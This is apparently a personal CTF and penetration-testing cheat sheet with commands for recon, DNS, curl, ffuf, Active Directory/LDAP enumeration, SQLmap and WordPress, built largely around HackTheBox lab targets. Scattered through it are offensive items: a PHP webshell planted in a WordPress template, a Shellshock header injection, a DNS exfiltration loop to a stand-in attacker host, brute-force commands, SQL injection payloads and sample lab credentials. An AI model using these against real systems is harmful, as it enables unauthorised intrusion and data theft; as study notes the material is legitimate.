# CTF & PenTesting Directory
 - [HackTricks](https://book.hacktricks.wiki/en/index.html)
 - [HackTricks Cloud](https://cloud.hacktricks.wiki/en/index.html)
 - [OWASP](https://owasp.org/www-project-web-security-testing-guide/v42/)
 - [HackTheBox Academy](https://academy.hackthebox.com)

 - `nmap -sC -sV -p- -oN nmapscsn.txt TARGETIP`
 - `finalrecon --full example.com`
 - `sudo nano /etc/hosts` - Ctrl-X --> Y --> Enter
 - `echo "10.129.227.248 s3.thetoppers.htb" | sudo tee -a /etc/hosts`
 - `echo aHR0cHM6Ly93d3cuaGFja3RoZWJveC5ldS8K | base64 -d`
 `- grep -C 5 "5linesaroundmatch" example.txt`

**1. Recon Methodology:**
## Questions to ask
### Have a web traffic port?
  - Is it accessible? What are the response codes and headers?
    - `curl -s -I -L http://<IP>` 
  - Is there a robots.txt?
    - `curl http://<IP>/robots.txt`
  - What service is running behind it? Apache, Nginx, IIS, Tomcat?
    - See above NMAP scan
  - Can you DNS zone transfer? (need domain name)
    - `dig @ns1.example.com example.com axfr`
    - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>`
  - Are they any hidden directories? (google.com/XYZ)
    - `ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt`
    - `gobuster dir -u http://<IP> -w wordlist.txt`
    - `dirb http://<IP>/ wordlist.txt`
  - Are there any hidden subdomains? (XYZ.google.com - Remember to add subdomains to your hosts file as you discover them.)
    - `ffuf -u http://FUZZ.example.com -w subdomains.txt -fs 404`
    - `dnsenum --enum inlanefreight.com -f wordlist.txt`
    - `subfinder -d <DOMAIN>`
  - What is the domain name of the ip?
    - `nslookup <IP_ADDRESS>`
  - Can you see any outdated software or known vulnerabilities?
    - See above NMAP scan or `nmap --script vuln <IP>` | `nikto -h http://<IP>`
  - Can you see any subdomains in the CT logs?
    - `curl -s "https://crt.sh/?q=facebook.com&output=json" | jq -r '.[] | select(.name_value | contains("dev")) | .name_value' | sort -u`
  - Is there an SSL/TLS Certificate? Self-signed? And what domains does it cover?
    - `sslscan <IP>:443`
    - `openssl s_client -connect <IP>:443`
   - What kind of authN is there? Can you brute force?
    - `medusa -h <IP> -U userlist.txt -P passlist.txt -M http`
    - `hydra -L users.txt -P passwords.txt <IP> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"`
  - Are there API endpoints? Look for `/api`, `/graphql`, `/swagger`, `/openapi.json`
    - `gobuster dir -u http://<IP> -w api-wordlist.txt`
  - Is there the oppurtunity for SQL Injection, XXS, SSRF or command injection?
  - Can you check cookies and session management? Are they `HttpOnly`, `Secure`, `SameSite`?
  - Can you find a vhost? (Look at the `host` header - does the request hostname match the response hostname?)
    - Add all subdomains/vhosts to hosts file and enumarate again - they can be nested.
    - `ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb'`
  - Is there a WAF?
    - `wafw00f inlanefreight.com`
    - `nikto -h inlanefreight.com `
  - Have you find anything by web crawling?
    -  `python3 ReconSpider.py http://inlanefreight.com`
  - Is there anything on [WebArchive / Waybackmachine?](https://web.archive.org)

### Have an SSH port?
 - What version of SSH is running?
   - `nmap -p 22 --script ssh2-enum-algos,ssh-hostkey,sshv1 <IP>`
   - `nc <IP> 22`
 - Are there any known vulnerabilities for the SSH version?
   - `searchsploit OpenSSH <VERSION>`
   - `msfconsole search OpenSSH`
 - Can I enumerate valid usernames?
   - `hydra -L users.txt -p test123 ssh://<IP> -V`


# JavaScript Deobfuscate
  - [Make it pretty](https://prettier.io/playground/) --> then [unpack](https://matthewfl.com/unPacker.html)
  - Run Javacript console - https://jsconsole.com/

# WordPress Info (Use API token to get vuln details)
- https://github.com/wpscanteam/wpscan
- WordPress is written in PHP and usually runs on Apache with MySQL as the backend.
- Webroot located at /var/www/html
- Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.
- A Content Management Application (CMA) - the interface used to add and manage content. A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.
- Look for index.php, license.txt, wp-activate.php, /var/www/html/wp-includes, /var/www/html/wp-admin and /var/www/html/wp-content.
- WP has Admin, Editor, Author, Contributor, Subscriber roles. The admin user is usually assigned the user ID 1
- Look for `<meta name="generator" content="WordPress 5.3.3" />` (`curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'`)
- Look for particular plugins - `curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/someplugin` 404 if it doesnt exist
- `curl -s -X GET http://94.237.48.48:34933/wp-content/plugins/mail-masta/inc/flag.txt | html2text`
- User Enumeration - `curl -s -I http://blog.inlanefreight.com/?author=1` Usually admin, if not then 404
- WPSCAN enumeration - `wpscan --url http://blog.inlanefreight.com --enumerate --api-token Kffr4fdJzy9qVcTk<SNIP>`
- > 4.7.1 wordpress user enumeration - `curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq`
- The tool uses two kinds of login brute force attacks, `xmlrpc` and `wp-login`. The `wp-login` method will attempt to brute force the normal WordPress login page, while the `xmlrpc` method uses the WordPress API to make login attempts through `/xmlrpc.php`. The `xmlrpc` method is preferred as it is faster.
- `wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com`
- Modify template 404.php file with - `system($_GET['cmd']);` then `curl -X GET "http://<target>/wp-content/themes/twentyseventeen/404.php?cmd=id"`



**2. ??**


## Browser DevTools Shortcuts
- Show DevTools - `[CTRL+SHIFT+I]` or `[F12]`
- Show Network tab  `[CTRL+SHIFT+E]` 
- Show Console tab  `[CTRL+SHIFT+K]` 

## General
- Add to /etc/hosts- `echo "192.168.1.100 example.com" | sudo tee -a /etc/hosts`
- Determine file type - `file -i file.txt`  
- Extract/Unzip file - `unzip file.txt -d extractedfileoutput.txt`
- Powershell cmd to find installed software on Windows - `get-ciminstance win32_product | fl`
- To filter out Microsoft Software - `get-ciminstance win32_product -Filter "NOT Vendor like '%Microsoft%'" | fl`
- See privileges - `whoami /priv` (works best when cmd is running as admin)

# nmap
- `nmap -sC -sV -p- TARGETIP`

# [WHOIS](https://whoisrb.org/docs/) commands
- The `whois` command queries **WHOIS databases** to retrieve information about domain registrations, IP addresses, and network ownership. 
- Basic WHOIS Lookup `whois example.com` 
- Use grep for specifics `whois google.com \| grep "Name Server"` 
- Team Cymru malware hash lookup using whois: (Note: Output is timestamp of last seen and detection rate) `whois -h hash.cymru.com <SUSPICIOUS FILE HASH>` 

# [dig](https://linux.die.net/man/1/dig) commands

- The `dig` command (Domain Information Groper) is a versatile and powerful utility for querying DNS servers and retrieving various types of DNS records
- A DNS zone transfer is essentially a wholesale copy of all DNS records within a zone (a domain and its subdomains) from one name server to another. The information gleaned from an unauthorised zone transfer can be invaluable to an attacker. It reveals a comprehensive map of the target's DNS infrastructure, including subdomains, IP addresses and name server records. If the server is misconfigured and allows the transfer, you'll receive a complete list of DNS records for the domain, including all subdomains.

- Performs a default A record lookup for the domain. - `dig domain.com` 
- Retrieves the IPv4 address (A record) associated with the domain. - `dig domain.com A` 
- Retrieves the IPv6 address (AAAA record) associated with the domain. - `dig domain.com AAAA` 
- Finds the mail servers (MX records) responsible for the domain - `dig domain.com MX` 
- Identifies the authoritative name servers for the domain - `dig domain.com NS` 
- Retrieves any TXT records associated with the domain - `dig domain.com TXT` 
- Retrieves the canonical name (CNAME) record for the domain - `dig domain.com CNAME`
- Retrieves the start of authority (SOA) record for the domain - `dig domain.com SOA` 
- Specifies a specific name server to query; in this case 1.1.1.1 - `dig @1.1.1.1 domain.com` 
- Shows the full path of DNS resolution - `dig +trace domain.com` 
- Performs a reverse lookup on the IP address 192.168.1.1 to find the associated hostname. You may need to specify a name server - `dig -x 192.168.1.1` 
- Provides a short, concise answer to the query. - `dig +short domain.com` 
- Displays only the answer section of the query output. - `dig +noall +answer domain.com` 
- Retrieves all available DNS records for the domain (Note: Many DNS servers ignore ANY queries to reduce load and prevent abuse, as per RFC 8482). - `dig domain.com ANY` 
- Reverse domain lookup - `dig -x <IP_ADDRESS>` 
- DNS zone transfer - `dig axfr <DOMAIN_NAME_TO_TRANSFER> @<DNS_IP>` (axfr is the zone transfer request)
- DNS reverse lookup (Replace first three octets of IP to set class C address to scan) - `for ip in {1..254..1}; do dig –x 1.1.1.$ip \| grep $ip >> dns.txt; done;`
- On Victim: Read in each line and do a DNS lookup - `for b in `cat file.hex `; do dig $b.shell.evilexample.com; done`
- Lookup domain by IP - `dig -x <ip>`
- Host transfer - `dig @ <ip> <domain> it AXFR`

**Caution**: Some servers can detect and block excessive DNS queries. Use caution and respect rate limits. Always obtain permission before performing extensive DNS reconnaissance on a target.

---

## [cURL](https://curl.se/docs/) Commands
`cURL` is a command-line tool for transferring data using various protocols (HTTP, HTTPS, FTP, etc.). It is commonly used for making web requests, downloading/uploading files, testing APIs, and automating network tasks. Use `| html2text` to make it more readable! for the love of god end URLs with a /

### **General & Help Flags**
- cURL help menu - `curl -h` / `curl --help-all` 
- Shows all available options in a long list - `curl --help all` 
- Lists all available categories of options - `curl --help category` 
- Shows help for a specific category (e.g., HTTP) - `curl --help http` 
- Displays the full manual page - `curl -M` / `curl --manual` 
- Shows the version of `curl`, supported protocols, and features - `curl -V` / `curl --version` 

### **Verbose Output Flags**
- Provides detailed request/response info - `curl -v https://example.com` / `curl --verbose https://example.com` 
- Hides progress and error messages - `curl -s https://example.com` / `curl --silent https://example.com` 
- Hides progress but still shows errors - `curl -sS https://example.com` 

### **Debugging Headers & Data**
- Displays response headers with body - `curl -i https://example.com` / `curl --include https://example.com` 
- Fetches only headers (no body) - `curl -I https://example.com` / `curl --head https://example.com` 
- Logs detailed request/response data to file - `curl --trace curl.log https://example.com` 
- Logs request/response data in ASCII format - `curl --trace-ascii curl.log https://example.com` 
- Custom output formatting (e.g., response time) - `curl -w "Response Code: %{http_code}\n" -o /dev/null -s https://example.com`

### **HTTP Methods & Request Manipulation**
- Basic GET request | `curl inlanefreight.com` |
- Sends a custom HTTP request method - `curl -X PUT https://example.com/resource` 
- Modifies or adds custom headers - `curl -H "X-Forwarded-For: 127.0.0.1" https://example.com` 
- Sends data via POST request - `curl -X POST -d "username=admin&password=admin" https://example.com/login` 
- Reads request body from a file - `curl -X POST -H "Content-Type: application/json" -d @data.json https://example.com/api` 

### **Authentication & Cookies**
- Uses Basic Authentication - `curl -u admin:password https://example.com/protected` 
- Uses a session cookie - `curl -b "PHPSESSID=abcd1234" https://example.com/dashboard` 
- Stores cookies from a response - `curl -c cookies.txt https://example.com` 
- Uses stored cookies for a new request - `curl -b cookies.txt https://example.com` 

### **Proxy & Evasion Techniques**
- Sends requests through a proxy - `curl -x http://proxy.example.com:8080 https://target.com` 
- Uses a SOCKS5 proxy (e.g., Tor) - `curl --socks5 127.0.0.1:9050 https://target.onion` 
- Changes the User-Agent string - `curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" https://example.com` 
- Spoofs the Referer header - `curl -e "https://google.com" https://example.com` 

### **Enumeration & Reconnaissance**
- Checks available HTTP methods - `curl -X OPTIONS -i https://example.com`
- Follows redirects - `curl -L https://example.com` 
- Measures response time - `curl -o /dev/null -s -w "Time: %{time_total}s\n" https://example.com` 
- Dumps response headers - `curl -I https://example.com` 

### **File Transfers & Exploitation**
- Uploads a file via POST - `curl -F "file=@exploit.php" https://example.com/upload` 
- Uploads a file via PUT - `curl -X PUT --data-binary @exploit.php https://example.com/exploit.php` 
- Downloads a file from a server - `curl -O https://example.com/file.txt` 
- Executes command injection through headers - `curl -H "User-Agent: () { :; }; /bin/bash -c 'id'" https://example.com` 

### **API Interactions & Security Tools**
- Read API entry - `curl http://<SERVER_IP>:<PORT>/api.php/city/london` 
- Read all API entries - `curl -s http://<SERVER_IP>:<PORT>/api.php/city/ | jq` 
- Create API entry - `curl -X POST http://<SERVER_IP>:<PORT>/api.php/city/ -d '{"city_name":"HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` 
- Update API entry - `curl -X PUT http://<SERVER_IP>:<PORT>/api.php/city/london -d '{"city_name":"New_HTB_City", "country_name":"HTB"}' -H 'Content-Type: application/json'` 
- Delete API entry - `curl -X DELETE http://<SERVER_IP>:<PORT>/api.php/city/New_HTB_City` 
- Send a suspicious hash to VirusTotal - `curl -v --request POST --url 'https://www.virustotal.com/vtapi/v2/file/report' -d apikey=<VT API KEY> -d 'resource=<SUSPICIOUS FILE HASH>'` 
- Send a suspicious file to VirusTotal - `curl -v -F 'file=/<PATH TO FILE>/<SUSPICIOUS FILE NAME>' -F apikey=<VT API KEY> https://www.virustotal.com/vtapi/v2/file/scan` 

---

# [dnsenum](https://github.com/fwaeytens/dnsenum) commands
Comprehensive DNS enumeration tool that supports dictionary and brute-force attacks for discovering subdomains. REMINDER: Subdomains are the XYZ.google.com and directories are the google.com/XYZ
- `dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt`

---

# [dnsrecon](https://github.com/darkoperator/dnsrecon) commands
Versatile tool that combines multiple DNS reconnaissance techniques and offers customisable output formats.

# Remote Server Administration Tool (RSAT)
Allows systems administrators to remotely manage Windows Server roles and features from a workstation running Windows 10, Windows 8.1, Windows 7, or Windows Vista. RSAT can only be installed on Professional or Enterprise editions of Windows. In an enterprise environment, RSAT can remotely manage Active Directory, DNS, and DHCP. RSAT also allows us to manage installed server roles and features, File Services, and Hyper-V. If installed the toolsd will be available under the Administrative Tools in the Control Panel
- Check which, if any RSAT tools are install - `Get-WindowsCapability -Name RSAT* -Online | Select-Object -Property Name, State`
- Install all available RSAT - `Get-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability –Online`
- Or one at a time - `Add-WindowsCapability -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0  –Online`

# ldap
We can communicate with the directory service using LDAP queries to ask the service for information. Lightweight Directory Access Protocol (LDAP) is an integral part of Active Directory (AD). AD Powershell module cmdlets with `-Filter` and `-LDAPFilter` flags are usually how search or filter for LDAP information. LDAPFilter uses Polish notation.
- For alisting of all user rights assigned to your current user - `whoami /priv`
- Get all AD groups - `Get-ADObject -LDAPFilter '(objectClass=group)' | select name`
- Get all administratively disabled accounts - `Get-ADObject -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))' -Properties * | select samaccountname,useraccountcontrol`
- Find administrative AD groups - `Get-ADGroup -Filter "adminCount -eq 1" | select Name`
- Search all hosts in the domain like SQL* - `Get-ADComputer  -Filter "DNSHostName -like 'SQL*'"` (Be careful filtering on DNSHostname, it's assuming it's correctly labelled.)
- Find computer that starts with RD - `Get-ADComputer -Filter {Name -like 'RD*'} - Properties *`
- Allo domain admin users with DoesNotRequirePreAuth - `Get-ADUser -Filter {adminCount -eq '1' -and DoesNotRequirePreAuth -eq 'True'}`
- All admin users with a ServicePrincipalName (SPN) - `Get-ADUser -Filter "adminCount -eq '1'" -Properties * | where servicePrincipalName -ne $null | select SamAccountName,MemberOf,ServicePrincipalName | fl`
- Filter on Disabled User Accounts - `Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select name`
- This rule will find all groups that the user Harry Jones is a member of - `Get-ADGroup -LDAPFilter '(member:1.2.840.113556.1.4.1941:=CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL)' | select Name`
- Search for all domain users that do not have a blank description field - `Get-ADUser -Properties * -LDAPFilter '(&(objectCategory=user)(description=*))' | select samaccountname,description`
- Find Trusted Computers - `Get-ADComputer -Properties * -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' | select DistinguishedName,servicePrincipalName,TrustedForDelegation | fl`
- Find admin users where the password can be blank - `Get-AdUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl`
- Find users where password can be blank (no extra filters - `Get-AdUser -LDAPFilter '(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))(adminCount=1)' -Properties * | select name,memberof | fl`
- Find nested group membership of a user with the RecursiveMatch parameter - `Get-ADGroup -Filter 'member -RecursiveMatch "CN=Harry Jones,OU=Network Ops,OU=IT,OU=Employees,DC=INLANEFREIGHT,DC=LOCAL"' | select name`
- Count all AD users - `(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -Filter *).count`
- Count all AD users within all child containers - `(Get-ADUser -SearchBase "OU=Employees,DC=INLANEFREIGHT,DC=LOCAL" -SearchScope Subtree -Filter *).count`
- What group is a IT Support group nested to? - `Get-ADGroup -Identity "IT Support" -Properties MemberOf | Select-Object -ExpandProperty MemberOf`
- User accounts that require a smart card for interactive logon (SMARTCARD_REQUIRED) - `Get-ADUser -Filter {SmartcardLogonRequired -eq $true} -Properties SmartcardLogonRequired | Select-Object Name, SamAccountName`
- Find user who has useraccountcontrol attribute to 262656 - `Get-ADUser -LDAPFilter "(userAccountControl=262656)" -Properties userAccountControl, DistinguishedName | Select-Object -First 1 Name, SamAccountName, DistinguishedName, userAccountControl`
- Who is a member of a group via nested groups? - ```function Get-NestedGroupMembers {param ([string]$GroupName)
Get-ADGroupMember -Identity $GroupName -Recursive | Select-Object Name, SamAccountName, ObjectClass} Get-NestedGroupMembers -GroupName "IT Support"```
- Show me all admin groups - `Get-ADGroup -LDAPFilter "(adminCount=1)" | Select-Object Name, SamAccountName`
- Count me all admin groups - `(Get-ADGroup -LDAPFilter "(adminCount=1)" | Select-Object Name, SamAccountName).count`
- Find all users subject to ASREPRoasting and NOT a protected user - ```$asrepUsers = Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth, SamAccountName | Select-Object SamAccountName
$protectedUsers = Get-ADGroupMember -Identity "Protected Users" | Select-Object -ExpandProperty SamAccountName
$asrepUsers | Where-Object { $_.SamAccountName -notin $protectedUsers }```
- Get all users with a SPN set - `Gety-ADObject -LDAPFilter "(servicePrincipalName=*)`



## Unauthenticated LDAP enumeration
To check if we can interact with LDAP without credentials run this python:
```p
from ldap3 import *
s = Server('<IP>', get_info = ALL)
c = Connection(s,'','')
c.bind()

Should return: True

s.info
exit()
```
If you can anonymously enumerate ldap, then `s.info` should give you the CN and DCs e.g `CN=Configuration,DC=sequel,DC=htb`. Then you can use the ldapsearch tool.
- `ldapsearch -H ldap://10.129.1.207 -x -b "dc=inlanefreight,dc=local"`

Windapsearch.py is a Python script used to perform anonymous and authenticated LDAP enumeration of AD users, groups, and computers using LDAP queries. It is an alternative to tools such as ldapsearch, which require you to craft custom LDAP queries:
- To confirm connection anonymously - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" --functionality`
- Pull list of users - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -U`
- Pull list of computers - `python3 windapsearch.py --dc-ip 10.129.1.207 -u "" -C`
- Authenitcated search - `python3 windapsearch.py --dc-ip 10.129.85.28 -u "rose" -p "KxEPkKe6R8su"`

ldapsearch-ad.py is another tool worth trying:
- `python3 ldapsearch-ad.py -h`
- Gives you everything - `python3 ldapsearch-ad.py -l 10.129.85.28 -t info`
- Users that can be ASREPRoasted - `python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t asreproast`

## Authenticated LDAP enumeration
Remeber you may lack RDP perms to the box but still have perms to auth enumerate with LDAP
- `python3 windapsearch.py --dc-ip 10.129.1.207 -u inlanefreight\\james.cross --da` (`domain\\username`)
- `python3 ldapsearch-ad.py -l 10.129.1.207 -d inlanefreight -u james.cross -p Summer2020 -t pass-pols`
- Will reveal if accounts are prone to kerberoast: `python3 ldapsearch-ad.py -l 10.129.85.28 -d sequel -u rose -p KxEPkKe6R8su -t all`

# DSQuery
DS Tools is available by default on all modern Windows operating systems but required domain connectivity to perform enumeration activities.
- `dsquery user "OU=Employees,DC=inlanefreight,DC=local" -name * -scope subtree -limit 0 | dsget user -samid -
pwdneverexpires | findstr /V no`

# WMI
Windows Management Instrumentation (WMI) can also be used to access and query objects in Active Directory. Many scripting languages can interact with the WMI AD provider, but PowerShell makes this very easy.
- `Get-WmiObject -Class win32_group -Filter "Domain='INLANEFREIGHT'" | Select Caption,Name`

# ADSI
Active Directory Service Interfaces (ADSI) is a set of COM interfaces that can query Active Directory. PowerShell again provides an easy way to interact with it.
- `([adsisearcher]"(&(objectClass=Computer))").FindAll() | select Path`

# SSH commands
- Login - `ssh username@host`
- Login with SSH Key - `ssh -i /path/to/private_key username@host`
- Create new SSH key pair - `ssh-keygen -t rsa -b 4096`
- Execute command without logging in - `ssh username@host "command"`
- Check auth methods of SSH - `nmap -p22 --script ssh-auth-methods <TARGET-IP>`

# Gobuster
- Enumerate hidden directories - `gobuster dir -u http://backfire.htb:8000/ -w wordlist.txt`

# HTTPie

# Wget Commands

# Netcat (nc) Commands

# Telnet Commands

# FFuf Commands (Use domain name)
Useful for fuzzing directories, files + extensions, vhosts, PHP parameters and parameter values. To scan for VHosts, without manually adding the entire wordlist to our /etc/hosts, we will be fuzzing HTTP headers, specifically the Host: header. To do that, we can use the -H flag to specify a header and will use the FUZZ keyword within it. 
- `ffuf -u http://FUZZ.domain:41823 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt`
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://domain:PORT/blog/indexFUZZ`
- `ffuf -w /opt/useful/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://domain:PORT/blog/FUZZ.php` (If we know it runs PHP)
- This one for all enumerating - `ffuf -w cleaned-wordlist.txt:FUZZ -u http://83.136.250.52:37289/FUZZ -recursion -recursion-depth 1 -e .php -mc 200,301,302,403 -t 50 -o results.txt -v`
- This one for VHOST - `ffuf -w /opt/useful/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs xxx`
- Parameter Fuzzing GET - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx`
- Parameter Fuzzing POST (-d) - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx` - then try to use curl with any keys found
- Value Fuzzing - `ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:58083/admin/admin.php -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -mc 200,302,403,500 -t 50 -v`
- Page fuzzing - `ffuf -w /opt/useful/seclists/Discovery/Web-Content/web-extensions.txt:FUZZ -u http://SERVER_IP:PORT/blog/indexFUZZ`

# Dirb

# Gobuster

# Wappalyzer

# Tcpdump

# Tshark

# [SQLmap](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
- Run it via taskbar or with 'sqlmap'
- advanced help is `-hh`
- The technique characters BEUSTQ refers to the following:
    - B: Boolean-based blind - most common (`AND 1=1`)
    - E: Error-based (`AND GTID_SUBSET(@@version,0)`)
    - U: Union query-based (`UNION ALL SELECT 1,@@version,3`)
    - S: Stacked queries (`; DROP TABLE users`)
    - T: Time-based blind (`AND 1=IF(2>1,SLEEP(5),0)`)
    - Q: Inline queries (`SELECT (SELECT @@version) from`)

 - SQLMap Output descriptions - `https://academy.hackthebox.com/module/58/section/696`
 - Best way to properly set up an SQLMap request against a specific target is to sue 'Copy as cURL'. By pasting the clipboard content into the command line, and changing the original command curl to sqlmap, we are able to use SQLMap with the identical curl command - `sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'`
 - Flags for automatic paramter finding - `--crawl, --forms or -g`
 - GET requests usually include -u / --url but POST requests usually contai nthe --data flag - `sqlmap 'http://www.example.com/' --data 'uid=1&name=test'`
 - POST parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter uid is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using -p uid. Otherwise, we could mark it inside the provided data with the usage of special marker * as follows - `sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'`
 - Can run SQLMap with a HTTP request file using the `-r` flag. Similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.
 - Specify the cookie with `--cookie` or `-H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'`
 - To randomize the User-Agent header value use `--random-agent` or `--mobile` to imitate a phone


# Nikto

# Hydra

# JWT-Tool

# smb commands

# BloodHound
- To start Neo4j in console - `cd /usr/bin` --> `sudo ./neo4j console`
- Run Bloodhound GUI - `./BloodHound --no-sandbox` (saved on desktop) and auth with Neo4j creds - neo4j 123
- Likes Java 11
